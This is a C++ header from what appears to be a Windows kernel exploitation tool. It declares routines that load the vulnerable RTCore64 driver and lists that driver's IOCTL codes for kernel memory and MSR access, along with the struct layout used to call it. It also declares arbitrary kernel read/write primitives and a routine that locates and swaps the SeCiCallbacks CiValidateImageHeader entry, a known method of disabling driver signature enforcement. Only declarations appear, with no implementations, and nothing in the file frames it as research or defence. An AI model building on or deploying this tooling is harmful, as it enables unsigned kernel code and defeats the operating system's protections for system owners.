#pragma once
#include <intrin.h> 
#include <Windows.h>
#include <cstdarg>    
#include <cstddef>    
#include <winsmcrd.h>
#include <cstdint>
#include "nt_structs.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <math.h>
#include <ntstatus.h>
#include <Psapi.h>
#include <cstdio>   
#include <string>
#include <cstdint> 
#include <shlwapi.h>  
#include <vector>

#pragma comment(lib, "shlwapi.lib")  
#pragma comment(lib, "ntdll.lib") 
// todo:  cleaan entire proj

static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];

#define RTC64_DEVICE_NAME_W								L"\\Device\\RTCore64"
#define FILE_DEVICE_RTCORE								0x8010

const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

struct seCiCallbacks_swap {
	uint64_t ciValidateImageHeaderEntry;
	uint64_t zwFlushInstructionCache;
};

typedef struct _GIOMemcpyInput{
	ULONG64 Dst;
	ULONG64 Src;
	DWORD64 Size;
} GIOMemcpyInput, * PGIOMemcpyInput;

namespace vuln {
	NTSTATUS driver_init( PWCHAR LoaderName, PWCHAR DriverName );
	NTSTATUS drv_call( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load );
}

namespace modules {
	void* retr_ntos_base();
	PVOID find_kernel_device( const std::wstring& targetModuleName);

	seCiCallbacks_swap get_CIValidate_ImageHeaderEntry();
}

namespace helpers {
	
	struct EntryPointInfo {
		uintptr_t absoluteVA; 
		uintptr_t rva;        
	};
	struct MemoryOperation
	{
		uint8_t gap1[8];     // 8 bytes gap
		DWORD64 address;	 // 8 bytes
		uint8_t gap2[4];     // 4 bytes gap
		uint32_t offset;     // 4 bytes
		uint32_t size;       // 4 bytes
		uint32_t data;       // 4 bytes
		uint8_t gap3[16];    // 16 bytes gap
	};

	extern HANDLE dev;

	bool CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr );

	uintptr_t GetProcAddress( void* hModule, const wchar_t* wAPIName );

	bool find_pattern( const uint8_t* base, size_t scanSize, const uint8_t* pattern, size_t patternSize, uint64_t& outAddress );

	void DeleteService( PWCHAR ServiceName );

	bool read_32( DWORD64 address, uint32_t& buffer );

	bool read_64( DWORD64 address, DWORD64& buffer );

	bool write_64( DWORD64 address, DWORD64 value );


	void WriteMemoryPrimitive( HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value );


	bool write_32( DWORD64 address, uint32_t value );

	uint64_t ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffset, int instrSize );

	/*
	*
	* Driver Loading Related def
	*
	*/

	NTSTATUS EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName );

	NTSTATUS OpenDeviceHandle( PHANDLE DeviceHandle, BOOLEAN PrintErrors );

	NTSTATUS CreateDriverService( PWCHAR ServiceName, PWCHAR FileName );

	int ConvertToNtPath( PWCHAR Dst, PWCHAR Src );

	NTSTATUS LoadDriver( PWCHAR ServiceName );

	NTSTATUS UnloadDriver( PWCHAR ServiceName );

	void FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName );

	static auto match_ascii_icase = []( const wchar_t* a, const wchar_t* b ) -> bool {
		while ( *a && *b ) {
			wchar_t ca = *a++, cb = *b++;
			if ( ca >= L'A' && ca <= L'Z' ) ca |= 0x20;
			if ( cb >= L'A' && cb <= L'Z' ) cb |= 0x20;
			if ( ca != cb ) return false;
		}
		return *a == *b;
	};
}

namespace globals {
	void splashscreen();
	extern ULONG_PTR nt_base;
}

namespace test {
	NTSTATUS WriteMemoryPrimitive( HANDLE Device, DWORD64 Address, DWORD Value );
	NTSTATUS WriteMemoryDWORD64( HANDLE Device, DWORD64 Address, DWORD64 Value );
}